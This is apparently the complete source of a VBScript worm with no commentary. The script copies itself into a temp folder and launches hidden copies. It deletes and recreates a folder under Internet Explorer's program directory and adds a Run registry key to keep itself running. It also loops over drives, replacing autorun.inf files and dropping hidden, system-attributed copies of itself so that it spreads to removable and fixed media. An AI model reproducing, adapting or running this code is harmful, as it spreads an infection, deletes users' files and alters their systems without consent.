dim TTTTT(2)
Set FSO = Createobject("Scripting.FileSystemObject")
set OSC = createobject("Wscript.shell")
WWW = OSC.ExpandEnvironmentStrings("%systemroot%")
REP0 = "C:\Program Files\Internet Explorer\Connection Wizard\icwconn1"
set TTT = FSO.getfile(Wscript.ScriptFullname)
set TTTT = TTT.openastextstream(1,-2)
do while not TTTT.atendofstream
  MonCode = MonCode & TTTT.readline :  MonCode = MonCode & vbcrlf
Loop
Set TTTT = Nothing
Set TTT = Nothing

TAMP = OSC.ExpandEnvironmentStrings("%TEMP%") & "\Mso" : TAMPO = TAMP & "\"
MonDir = Left(Wscript.ScriptFullname, InStrRev(Wscript.ScriptFullname, "\"))

If Len(MonDir) = 3 Then
  OSC.Run WWW & "\explorer.exe /n, " & MonDir
End If


If TAMPO <> MonDir Then
  If Not  FSO.FolderExists(TAMP) Then
    FSO.CreateFolder(TAMP)
  End If
  Set TTTT = FSO.Getfolder(TAMP).Files
  On Error Resume Next
  NBTT = 0
  For Each TTT In  TTTT
    TTT.Attributes = 0
    TTT.Delete
    If Err >0  Then
      NBTT = NBTT+1
    End If
  Next
  Set TTTT = Nothing
  Err.Clear
  NBFVB = FSO.Getfolder(TAMP).Files.Count
  If NBFVB < 5 Then
    For I = NBFVB To 5
      MonNom = "~$" & Left(FSO.GetTempName(),6) & ".vbs"
      MEZANHUN(MonNom)
      If I < 5 Then
        Wscript.Sleep 17000
      End If
    Next
  End If

  Wscript.Quit
End If

MonNom = left(FSO.GetTempName(),6) & ".vbs"

If Left(MonDir,len(REP0)) <> REP0 then
  On Error Resume Next
  If FSO.FolderExists(REP0) then
    FSO.DeleteFolder REP0 , True
    E1 = Err : Err.Clear
  End If
  FSO.CreateFolder(REP0) : E2 = Err : Err.Clear

  Rep = REP0 & "\" & Lcase(left(FSO.GetTempName(),4)) & "\"
  CHREG = "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\MS-" & ucase(left(FSO.GetTempName(),4))

  If E2 = 0 then
    set TTT = FSO.createtextfile(Rep & MonNom,2,true):TTT.write MonCode
    TTT.close  :set TTT = Nothing
    set TTT = FSO.getfile(Rep & MonNom):TTT.attributes = 39 :set TTT = Nothing
    OSC.regwrite CHREG,Rep & MonNom
  End If
End If

On Error Resume Next


DO
  If FSO.FileExists(TAMPO & "z") Then
    Set FSO = Nothing : Set OSC = Nothing
    Wscript.Quit
  End If
  MonNom = "MS" & mid(FSO.GetTempName(),3,4) & ".vbs"
  OtoReune = "[autorun]" & Vbcrlf & "shellexecute=wscript.exe " & MonNom
  For Each LECTEUR In FSO.Drives
  
    Place =  LECTEUR.path & "\" & MonNom
    If (LECTEUR.drivetype =1 OR LECTEUR.drivetype =2) and LECTEUR.path <> "A:" then
    BID = 0 : BYD = 0
        If FSO.FileExists(LECTEUR.Path & "\autorun.inf") Then
           set TTT =FSO.getfile(LECTEUR.path & "\autorun.inf")
           set TTTA = TTT.openastextstream(1,-2)		
           TTTTT(0) = TTTA.ReadLine : TTTTT(1) = TTTA.ReadLine                              				
           set TTTA= Nothing : Set TTT = Nothing

           Place2 = LECTEUR.Path & "\MS" & Right(TTTTT(1),8)
                                	
           TTTE = "shellexecute=wscript.exe " & "MS"
           If (TTTTT(0)<>"[autorun]" Or Left(TTTTT(1),27)<> TTTE) then
              set TTT =FSO.getfile(LECTEUR.path & "\autorun.inf")
              TTT.attributes = 32
              FSO.FileDelete LECTEUR.path & "\autorun.inf" , true
              set TTT = Nothing
           Else
              BID = 1							
           End If

           If FSO.FileExists(Place2) then
              BYD = 1
           End If
        End If
        
        If BID = 1 And BYD = 0  Then	
           For Each FVBS In FSO.Getfolder(LECTEUR.Path & "\").Files
              If Left(FVBS.Name,2) = "MS" And Right(FVBS.Name,4)= ".vbs" Then
                FVBS.Attributes = 32 : FVBS.Delete true
              End IF
           Next
           
           set TTT=FSO.createtextfile(Place2,2,true)
           TTT.Write MonCode : TTT.Close : Set TTT = Nothing
           set TTT=FSO.getfile(Place2)
           TTT.attributes = 39
           set TTT = Nothing
        End If
        If BID = 0 Then	
           For Each FVBS In FSO.Getfolder(LECTEUR.Path & "\").Files
              If Left(FVBS.Name,2) = "MS" And Right(FVBS.Name,4)= ".vbs" Then
                FVBS.Attributes = 32 : FVBS.Delete True
              End IF
           Next
           set TTT=FSO.createtextfile(Place,2,true)
           TTT.write MonCode
           TTT.close
           Set TTT = Nothing
           set TTT=FSO.getfile(Place)
           TTT.attributes = 39
           set TTT = Nothing
           set TTT=FSO.createtextfile(LECTEUR.path & "\autorun.inf",2,true)
           TTT.write OtoReune
           TTT.close
           Set TTT = Nothing
        End If
  	set TTT =FSO.getfile(LECTEUR.path & "\autorun.inf")
        TTT.attributes = 39
        set TTT = Nothing
    End If
  Next

  Wscript.Sleep 90000
Loop

Wscript.Quit

Sub MEZANHUN(CeNom)
  set TTT = FSO.createtextfile(TAMPO & CeNom,2,True)
  TTT.write MonCode
  TTT.close
  set TTT = Nothing
  set TTT = FSO.getfile(TAMPO & CeNom)
  TTT.Attributes = 39
  set TTT = Nothing
  OSC.run WWW & "\system32\wscript.exe " & """" & TAMPO & CeNom & """"   ,0 ,False
End Sub
